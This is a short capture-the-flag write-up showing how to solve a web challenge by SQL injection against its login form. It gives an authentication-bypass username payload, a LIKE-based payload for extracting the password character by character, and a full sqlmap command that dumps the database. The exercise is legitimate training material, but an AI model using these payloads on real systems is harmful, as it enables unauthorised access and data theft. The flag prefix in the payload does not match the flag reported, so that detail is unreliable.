# [Web] epic admin pwn - (50 pts)

## Description

this challenge is epic i promise

the flag is the password

[link](http://web2.utctf.live:5006/)

_by matt_

## Solution

Since we can sign in using `' or 1=1--` as username, we know that the website is vulnerable to SQL injection.

By using `admin' and password like 'utctf{%'--`, we can sign in successfully, too.

Then, we can get the flag cahracter by character using the payload above.

> By using sqlmap, we can get the flag without writing the script ourselves.

> $ sqlmap -u "http://web2.utctf.live:5006/" --data "username=test&pass=test" -p "username,pass" --technique B --dump

Flag `utflag{dual1pa1sp3rf3ct}`
